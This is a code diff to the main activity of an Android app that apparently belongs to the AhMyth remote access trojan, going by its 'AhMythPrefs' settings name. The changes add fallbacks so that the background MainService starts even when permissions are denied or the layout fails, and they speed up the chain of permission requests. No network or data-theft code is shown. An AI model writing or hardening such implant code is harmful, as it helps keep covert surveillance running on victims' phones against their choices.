@@ -53,21 +53,54 @@ public class MainActivity extends Activity {
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
-        setContentView(R.layout.activity_main);
-
-        Log.d(TAG, "MainActivity onCreate - Android " + Build.VERSION.RELEASE + " (SDK " + Build.VERSION.SDK_INT + ")");
-
-        // Start service immediately
-        startMainService();
         
-        // Then request permissions one by one
+        try {
+            setContentView(R.layout.activity_main);
+            Log.d(TAG, "MainActivity onCreate - Android " + Build.VERSION.RELEASE + " (SDK " + Build.VERSION.SDK_INT + ")");
+        } catch (Exception e) {
+            Log.e(TAG, "Error setting content view", e);
+            // Continue even if layout fails - still need to request permissions and start service
+        }
+        
+        try {
+            // Initialize SharedPreferences
+            sharedPreferences = getSharedPreferences("AhMythPrefs", Context.MODE_PRIVATE);
+        } catch (Exception e) {
+            Log.e(TAG, "Error initializing SharedPreferences", e);
+        }
+
+        // Request permissions FIRST before starting service (permissions may be needed for service)
         handler.postDelayed(new Runnable() {
             @Override
             public void run() {
-                buildPermissionList();
-                requestNextPermission();
+                try {
+                    buildPermissionList();
+                    if (!permissionsToRequest.isEmpty()) {
+                        requestNextPermission();
+                    } else {
+                        // No permissions needed, proceed with service
+                        startMainService();
+                        requestSpecialPermissions();
+                    }
+                } catch (Exception e) {
+                    Log.e(TAG, "Error in permission request flow", e);
+                    // Try to start service anyway
+                    startMainService();
+                }
             }
-        }, 1000);
+        }, 500); // Reduced delay for faster permission requests
+        
+        // Start service after a delay (service will start even if permissions fail)
+        handler.postDelayed(new Runnable() {
+            @Override
+            public void run() {
+                try {
+                    startMainService();
+                } catch (Exception e) {
+                    Log.e(TAG, "Error starting service in delayed handler", e);
+                }
+            }
+        }, 2000);
     }
 
     private void buildPermissionList() {
@@ -153,16 +186,31 @@ public class MainActivity extends Activity {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults);
         
         if (requestCode == PERMISSION_REQUEST_CODE) {
+            boolean allGranted = true;
             for (int i = 0; i < permissions.length; i++) {
                 String status = (grantResults[i] == PackageManager.PERMISSION_GRANTED) ? "GRANTED" : "DENIED";
                 Log.d(TAG, "Permission " + status + ": " + permissions[i]);
+                if (grantResults[i] != PackageManager.PERMISSION_GRANTED) {
+                    allGranted = false;
+                }
+            }
+            
+            // Log if permissions were denied
+            if (!allGranted) {
+                Log.w(TAG, "Some permissions were denied. App may have limited functionality.");
             }
             
             // Request next permission after short delay
             handler.postDelayed(new Runnable() {
                 @Override
                 public void run() {
-                    requestNextPermission();
+                    try {
+                        requestNextPermission();
+                    } catch (Exception e) {
+                        Log.e(TAG, "Error in requestNextPermission", e);
+                        // Continue with special permissions even if runtime permissions fail
+                        requestSpecialPermissions();
+                    }
                 }
             }, 300);
         }
@@ -409,12 +457,25 @@ public class MainActivity extends Activity {
             Intent serviceIntent = new Intent(this, MainService.class);
             
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                ContextCompat.startForegroundService(this, serviceIntent);
+                try {
+                    ContextCompat.startForegroundService(this, serviceIntent);
+                } catch (IllegalStateException e) {
+                    // If foreground service can't start, try regular service
+                    Log.w(TAG, "Foreground service failed, trying regular service", e);
+                    startService(serviceIntent);
+                }
             } else {
                 startService(serviceIntent);
             }
             
-            MainService.startService(this);
+            // Also call static start method as fallback
+            try {
+                MainService.startService(this);
+            } catch (Exception e) {
+                Log.w(TAG, "Static service start failed", e);
+            }
+        } catch (SecurityException e) {
+            Log.e(TAG, "Security error starting service - may need permissions", e);
         } catch (Exception e) {
             Log.e(TAG, "Error starting service", e);
         }
